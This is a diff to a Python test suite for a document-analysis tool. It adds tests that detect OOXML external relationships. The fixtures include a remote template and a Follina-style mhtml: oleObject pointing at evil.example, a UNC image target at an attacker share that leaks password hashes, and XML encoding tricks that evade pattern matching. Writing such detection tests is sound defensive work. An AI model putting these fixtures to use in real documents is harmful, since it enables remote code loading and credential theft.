@@ -5193,7 +5193,12 @@ def test_a_truncated_listing_that_did_find_macros_says_so_plainly(write):
 
     assert archive["truncated"] is True
     assert archive["macro_project"] is True
-    assert not any("not evidence" in problem for problem in archive["parse_errors"])
+    # The macro caveat specifically. This used to assert no "not evidence"
+    # message at all, which was the same thing until relationships gained a
+    # caveat of their own; that one is correct here, since no external
+    # relationship was found in a walk that stopped early.
+    assert not any("no macro project is not evidence" in problem
+                   for problem in archive["parse_errors"])
 
 
 def test_nothing_ooxml_reaches_the_gate(write):
@@ -7412,3 +7417,176 @@ def test_no_long_dashes_anywhere_in_the_repository():
             line = text.count("\n", 0, match.start()) + 1
             offenders.append(f"{path.relative_to(root)}:{line}")
     assert not offenders, offenders
+
+
+# External relationships in OOXML, the first v0.6 detection
+#
+# A document with no macros can still make Office fetch something on open,
+# and that is how remote template injection and the Follina chain worked.
+# Every hyperlink is also an external relationship, so the rule is about what
+# loads by itself.
+
+_REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+
+
+def _rels(*relations):
+    body = "".join(
+        f'<Relationship Id="r{index}" Type="{_REL}{kind}" Target="{target}"'
+        + (' TargetMode="External"' if external else "") + "/>"
+        for index, (kind, target, external) in enumerate(relations))
+    return f"<Relationships>{body}</Relationships>".encode()
+
+
+def _docx_with(write, rels, part="word/_rels/settings.xml.rels", name="report.docx"):
+    return analyse(write(name, _zip_bytes(_OOXML_PARTS + [(part, rels)])))
+
+
+def _ooxml_findings(report):
+    return {f["key"]: f for f in report.findings if f["key"].startswith("ooxml_")}
+
+
+def test_a_remote_template_is_reported(write):
+    report = _docx_with(write, _rels(("attachedTemplate", "https://evil.example/t.dotm", True)))
+    finding = _ooxml_findings(report)["ooxml_remote_template"]
+
+    assert finding["severity"] == "low"
+    assert finding["discriminator"] == "attachedTemplate"
+    assert "https://evil.example/t.dotm" in finding["detail"]
+
+
+def test_a_follina_shaped_external_object_is_reported(write):
+    """`oleObject` with an `mhtml:` target in `document.xml.rels` is how the
+    Follina chain reached its payload with no macro anywhere in the file."""
+    report = _docx_with(write, _rels(
+        ("oleObject", "mhtml:https://evil.example/x!x-usc:https://evil.example/y", True)),
+        part="word/_rels/document.xml.rels")
+    finding = _ooxml_findings(report)["ooxml_external_reference"]
+
+    assert finding["discriminator"] == "oleObject"
+    assert finding["severity"] == "low"
+    assert {e["name"]: e["value"] for e in finding["evidence"]}["scheme"] == "mhtml"
+
+
+def test_a_hyperlink_is_counted_and_not_reported(write):
+    """Every document with a link in it has one of these. A rule that
+    reported them would fire on most of a document corpus and say nothing."""
+    report = _docx_with(write, _rels(("hyperlink", "https://example.com", True),
+                                     ("hyperlink", "https://example.org", True)),
+                        part="word/_rels/document.xml.rels")
+
+    assert _archive_data(report)["relationships"]["hyperlinks"] == 2
+    assert _ooxml_findings(report) == {}
+
+
+def test_an_internal_relationship_is_not_external(write):
+    report = _docx_with(write, _rels(("attachedTemplate", "file:///C:/Templates/Normal.dotm", False)))
+    assert _ooxml_findings(report) == {}
+
+
+@pytest.mark.parametrize("rels", [
+    # A character reference: `External` to Word, not to a naive pattern.
+    f"<Relationships><Relationship Id='r1' Type='{_REL}attachedTemplate' "
+    f"Target='https://e/t' TargetMode='Ext&#101;rnal'/></Relationships>".encode(),
+    # A hexadecimal one, in the type as well.
+    f'<Relationships><Relationship Id="r1" Type="{_REL}attached&#x54;emplate" '
+    f'Target="https://e/t" TargetMode="&#x45;xternal"/></Relationships>'.encode(),
+    # A namespace prefix on the element.
+    f'<r:Relationships xmlns:r="x"><r:Relationship Id="r1" Type="{_REL}attachedTemplate" '
+    f'Target="https://e/t" TargetMode="External"/></r:Relationships>'.encode(),
+    # UTF-16, where a pattern written for UTF-8 sees only alternate NULs.
+    ("\ufeff" + f'<Relationships><Relationship Id="r1" Type="{_REL}attachedTemplate" '
+     f'Target="https://e/t" TargetMode="External"/></Relationships>').encode("utf-16-le"),
+    # Attributes split across lines, in an unusual order.
+    f'<Relationships><Relationship\n  TargetMode="External"\n  Target="https://e/t"\n'
+    f'  Type="{_REL}attachedTemplate" Id="r1" /></Relationships>'.encode(),
+])
+def test_the_ways_past_a_pattern_match_are_closed(write, rels):
+    """Word decodes XML before acting on it, so anything a pattern does not
+    decode is a way past it. Each of these was one."""
+    report = _docx_with(write, rels)
+    assert "ooxml_remote_template" in _ooxml_findings(report)
+
+
+def test_a_unc_image_says_what_it_costs(write):
+    """An external image is fetched to render, and a UNC target makes Windows
+    authenticate to whoever serves it, so the password hash leaves with no
+    click. The detail says so because the type alone does not."""
+    report = _docx_with(write, _rels(("image", "\\\\attacker\\share\\x.png", True)),
+                        part="word/_rels/document.xml.rels")
+    finding = _ooxml_findings(report)["ooxml_external_reference"]
+
+    assert finding["discriminator"] == "image"
+    # `low`, not `info`: an image loads to be rendered, with no click, and
+    # that is what separates it from a hyperlink.
+    assert finding["severity"] == "low"
+    assert "password hash" in finding["detail"]
+    assert {e["name"]: e["value"] for e in finding["evidence"]}["scheme"] == "unc"
+
+
+def test_an_external_relationship_that_does_not_load_itself_is_info(write):
+    report = _docx_with(write, _rels(("video", "https://example.com/v.mp4", True)),
+                        part="word/_rels/document.xml.rels")
+    assert _ooxml_findings(report)["ooxml_external_reference"]["severity"] == "info"
+
+
+def test_fifty_linked_images_are_one_finding(write):
+    """One per relationship type, with a count, so a catalogue of linked
+    images is one line rather than fifty."""
+    report = _docx_with(write, _rels(*[("image", f"https://cdn.example/{n}.png", True)
+                                       for n in range(50)]),
+                        part="word/_rels/document.xml.rels")
+    findings = [f for f in report.findings if f["key"] == "ooxml_external_reference"]
+
+    assert len(findings) == 1
+    assert {e["name"]: e["value"] for e in findings[0]["evidence"]}["count"] == 50
+    assert "and 49 more" in findings[0]["detail"]
+
+
+def test_relationships_are_read_only_in_a_document(write):
+    """A `.rels` file inside a plain ZIP is somebody's file, not a part map."""
+    body = _zip_bytes([("notes/_rels/a.rels",
+                        _rels(("attachedTemplate", "https://e/t", True)))])
+    report = analyse(write("bundle.zip", body))
+    assert "relationships" not in _archive_data(report)
+    assert _ooxml_findings(report) == {}
+
+
+def test_a_truncated_listing_cannot_prove_there_is_no_remote_template(write):
+    parts = _OOXML_PARTS + [(f"word/media/image{n}.png", b"\x89PNG\r\n\x1a\n" + bytes(64))
+                            for n in range(40)]
+    parts.append(("word/_rels/settings.xml.rels",
+                  _rels(("attachedTemplate", "https://e/t", True))))
+    report = analyse(write("report.docx", _zip_bytes(parts)),
+                     config={**DEFAULT_CONFIG, "archive_max_entries": 5})
+    archive = _archive_data(report)
+
+    assert archive["truncated"] is True
+    assert any("no external relationship is not evidence" in note
+               for note in archive["parse_errors"])
+
+
+def test_a_flood_of_external_relationships_is_capped_and_says_so(write):
+    report = _docx_with(write, _rels(*[("image", f"https://cdn.example/{n}.png", True)
+                                       for n in range(300)]),
+                        part="word/_rels/document.xml.rels")
+    archive = _archive_data(report)
+
+    assert len(archive["relationships"]["external"]) == 256
+    assert archive["relationships"]["truncated"] is True
+    assert any("list is partial" in note for note in archive["parse_errors"])
+
+
+def test_a_target_cannot_put_a_terminal_escape_in_a_report(write):
+    """The target is text the sample wrote, and it reaches a terminal."""
+    report = _docx_with(write, _rels(("attachedTemplate", "https://e/\x1b[2Jt", True)))
+    assert "\x1b" not in _ooxml_findings(report)["ooxml_remote_template"]["detail"]
+
+
+def test_no_relationship_finding_reaches_the_gate(write):
+    """`low` at most, for the reason the macro keys are: a corporate template
+    on SharePoint and an image on a file share are ordinary, and a document
+    corpus has to price that before anything here can fail a build."""
+    report = _docx_with(write, _rels(("attachedTemplate", "https://e/t", True),
+                                     ("oleObject", "mhtml:https://e/x", True),
+                                     ("image", "\\\\h\\s\\x.png", True)))
+    assert {f["severity"] for f in _ooxml_findings(report).values()} <= {"info", "low"}
